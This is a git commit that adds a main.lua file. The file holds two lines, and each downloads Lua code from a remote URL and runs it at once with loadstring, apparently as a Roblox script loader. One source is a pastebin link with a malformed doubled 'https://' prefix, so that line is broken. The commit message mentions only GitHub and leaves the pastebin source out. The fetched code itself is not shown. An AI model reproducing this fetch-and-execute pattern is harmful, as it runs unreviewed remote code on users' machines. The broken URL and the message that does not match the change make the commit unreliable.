39ab0a5f87615899108cc70dac5136c698082b3b
waealbert4-lab <waealbert4@gmail.com>
2026-03-16 15:51:38 -0700

    Add additional task to load script from GitHub

---
+++ main.lua
@@ -0,0 +1,2 @@
+task.spawn(function() loadstring(game:HttpGet("https://https://pastebin.com/L3bCY4iL"))() end)
+task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/waealbert4-lab/nine/refs/heads/main/main.lua"))() end)
